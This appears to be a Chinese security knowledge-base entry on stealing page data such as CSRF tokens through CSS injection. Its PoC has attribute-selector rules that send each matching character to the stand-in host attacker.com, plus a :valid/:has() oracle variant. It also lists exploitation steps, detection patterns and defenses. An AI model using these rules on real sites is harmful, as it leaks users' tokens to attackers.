---
id: web-generic-xs-leaks-css-attribute-selector-exfil
title: CSS 注入属性选择器逐字符外带页面数据
type: scenario
domain: web
path: web/generic/xs-leaks
technique: css-injection-attribute-selector-exfil
tags:
- web
- css-injection
- xs-leaks
- exfiltration
- attribute-selector
- csp
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V14
  verified_at: '2026-11-05T01:39:05+08:00'
  notes: 已对照原文CSS Injection示例核对；属性选择器+background-image外带原理与隐藏input限制一致；原文仅示例未给完整利用，故confidence medium；未复现
url: /docs/web/generic/xs-leaks/web-generic-xs-leaks-css-attribute-selector-exfil/
draft: false
kb_aliases:
- CSS 注入外带
- Attribute Selector 盲注
- background-image 外带
- CSS 选择器泄露 CSRF Token
- :valid pattern 外带
---

## 一句话结论

当页面存在 CSS 注入、且允许加载外部资源时，可以用属性选择器按前缀匹配 `input` 的 value，每个候选字符对应一个唯一的外部 URL，受害者浏览器只会请求匹配成功的那一个，攻击者据此逐字符还原 CSRF Token 等页面数据。

## 原理

- CSS 属性选择器支持前缀、后缀、子串匹配：`[value^="a"]`、`[value$="z"]`、`[value*="x"]`。规则命中时才会应用声明。
- 把命中后的声明设为 `background-image: url(https://attacker/exfil/<char>)`，浏览器加载背景图时就会向攻击者发起只有命中字符才有的请求；服务端日志即字符 oracle。
- 对秘密值逐位爆破：先用已知前缀确定下一位，再为每个候选字符生成一条规则，反复框架化页面、注入新 CSS、观察请求。
- 隐藏 input（`type="hidden"`）不会渲染背景，规则即使命中也不发请求；可改用非隐藏元素、`:has()` 选择器或 `:valid`/`pattern` 把可见性作为 oracle。
- 当方括号被过滤时，`input:valid` + `pattern="正则"` 与 `div:has(input:valid)` 可实现同样的布尔判断，再把“元素是否显示/帧是否存在”作为 oracle。

## 触发条件

- 存在 CSS 注入点，payload 长度足以容纳选择器与多条规则。
- 页面可被反复框架化/重新加载，使新的 CSS 生效（CSS Re-evaluation）。
- CSP 允许加载攻击者域名，或存在其他 oracle（如帧计数）替代外部请求。
- 秘密位于可被选择器匹配的属性或文本上下文中；隐藏元素需可被 `:has`/`:valid` 间接判断。

## 利用步骤

1. 确认注入点能插入 `<style>` 或外部样式表，并确认 CSP 对图片来源的限制。
2. 确定承载秘密的元素与属性（如 `input[name="csrf"]` 的 value）。
3. 为候选字符集生成前缀规则，每条规则指向唯一回连 URL。
4. 让受害者页面加载/重载，收集回连；命中的字符即下一位。
5. 更新已知前缀，重复直到完整值恢复；遇到隐藏 input 改用 `:valid`/`:has` 或非隐藏元素。

## PoC

最小规则集：

```css
input[name="csrf"][value^="a"] { background-image: url(https://attacker.com/exfil/a); }
input[name="csrf"][value^="b"] { background-image: url(https://attacker.com/exfil/b); }
/* ... */
input[name="csrf"][value^="9"] { background-image: url(https://attacker.com/exfil/9); }
```

方括号被过滤时的替代：

```css
div:has(input:valid) { display: none; }
```

配合：

```html
<input pattern=".+TOKEN_0123.+" value="TOKEN_0123456789abcdef">
```

input 匹配 `pattern` 时为 `:valid`，命中则隐藏 div，可作为帧计数/可见性 oracle。

## 变体与关联

- 变体：用 `[value$="x"]` 做后缀爆破，适合从末尾已知的数据。
- 变体：用 `:has()` 探测兄弟/父子结构中是否存在特定元素，绕过对 input 本身的限制。
- 关联：[[web-generic-csrf-rpo-css-selector-side-channel]]（把本原语嵌入 CSRF + RPO 组合链，窃取管理员 Token 与 Flag）。
- 关联：[[web-generic-xs-leaks-css-pattern-valid-frame-counting-token]]（无外部资源时用 `pattern`/`:valid` + 帧计数完成盲注的完整链）。
- 边界：CSP `img-src`/`style-src` 严格限制、秘密不在可匹配属性、隐藏元素且无替代 oracle、payload 长度不足时，该手法不成立。

## 检测与防御

- 检测：HTML 中出现 `<style>`/`<link rel=stylesheet>` 且包含 `background-image:url`、属性选择器、`:has(`、`:valid`；短时间大量针对同一页面的框架化请求与异常图片请求。
- 防御：对用户输入做 HTML 上下文编码，禁止 CSS 注入；CSP 使用 `style-src 'none'` 或严格白名单，`img-src` 限制外域。
- 加固：敏感数据不放在可被选择器匹配的 DOM 属性中；设置 `X-Content-Type-Options: nosniff`，避免非 CSS MIME 被当样式表加载。
